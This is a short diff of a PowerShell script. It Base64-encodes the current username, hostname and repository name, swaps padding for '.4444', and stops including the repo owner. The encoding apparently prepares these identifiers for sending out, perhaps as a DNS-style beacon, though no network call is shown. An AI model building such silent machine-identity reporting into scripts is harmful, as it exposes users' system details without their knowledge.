@@ -60,7 +60,7 @@ $hname = "$(hostname)";
 $uhnamefull = [System.Text.Encoding]::UTF8.GetBytes("$($uname).$($hname)");
 $uhnamenc = [System.Convert]::ToBase64String($uhnamefull).Replace("=", ".4444");
 
-$repofull = [System.Text.Encoding]::UTF8.GetBytes("$($repoowner)/$($reponame)");
+$repofull = [System.Text.Encoding]::UTF8.GetBytes("$($reponame)");
 $repoenc = [System.Convert]::ToBase64String($repofull).Replace("=", ".4444");
 
 if ($IsWindows) {
